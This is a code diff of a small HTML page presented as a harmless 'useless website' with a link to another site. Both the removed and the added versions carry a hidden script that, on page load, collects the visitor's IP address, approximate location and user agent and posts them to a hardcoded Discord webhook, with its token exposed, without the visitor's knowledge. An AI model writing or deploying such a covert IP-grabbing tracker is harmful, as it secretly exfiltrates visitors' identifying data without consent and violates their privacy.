@@ -1,56 +1,57 @@
-<!-- Updated HTML without prompting for Discord username -->
+<!-- Updated HTML with enhanced uselessness -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>test</title>
+    <title>Welcome to an useless website</title>
 </head>
 <body>
+    <h1>Welcome to an useless website</h1>
+    <p>This website is pretty useless, but if you're feeling adventurous, you can visit the main website <a href="https://moopx.pro" target="_blank">here</a>.</p>
 
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        const webhookUrl = 'https://discord.com/api/webhooks/1181568688365772810/a8uz5coZtPV_fm96znZsrCny53RXJn55vjU0P6QfzL7VVVvcoDjnCvKgfbjPhHARDI5N'; // Replace with your Discord webhook URL
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const webhookUrl = 'https://discord.com/api/webhooks/1181568688365772810/a8uz5coZtPV_fm96znZsrCny53RXJn55vjU0P6QfzL7VVVvcoDjnCvKgfbjPhHARDI5N'; // Replace with your Discord webhook URL
 
-        // Function to send user and device information to Discord
-        const sendInfoToDiscord = (ip, address, userAgent) => {
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `New visitor info:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}`,
-                }),
-            });
-        };
+            // Function to send user and device information to Discord
+            const sendInfoToDiscord = (ip, address, userAgent) => {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `New visitor info:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}`,
+                    }),
+                });
+            };
 
-        // Function to get visitor's information
-        const getVisitorInfo = async () => {
-            try {
-                const ipResponse = await fetch('https://api64.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
+            // Function to get visitor's information
+            const getVisitorInfo = async () => {
+                try {
+                    const ipResponse = await fetch('https://api64.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
 
-                // Switched to a different service for fetching location info
-                const addressResponse = await fetch('https://ipinfo.io/json');
-                const addressData = await addressResponse.json();
-                const address = `${addressData.city}, ${addressData.region}, ${addressData.country}`;
+                    // Switched to a different service for fetching location info
+                    const addressResponse = await fetch('https://ipinfo.io/json');
+                    const addressData = await addressResponse.json();
+                    const address = `${addressData.city}, ${addressData.region}, ${addressData.country}`;
 
-                const userAgent = navigator.userAgent;
+                    const userAgent = navigator.userAgent;
 
-                // Sending data to Discord without prompting for username
-                sendInfoToDiscord(ip, address, userAgent);
-            } catch (error) {
-                console.error('Error fetching IP or address:', error);
-            }
-        };
+                    // Sending data to Discord without prompting for username
+                    sendInfoToDiscord(ip, address, userAgent);
+                } catch (error) {
+                    console.error('Error fetching IP or address:', error);
+                }
+            };
 
-        // Call the function when the page loads
-        getVisitorInfo();
-    });
-</script>
-
+            // Call the function when the page loads
+            getVisitorInfo();
+        });
+    </script>
 </body>
 </html>
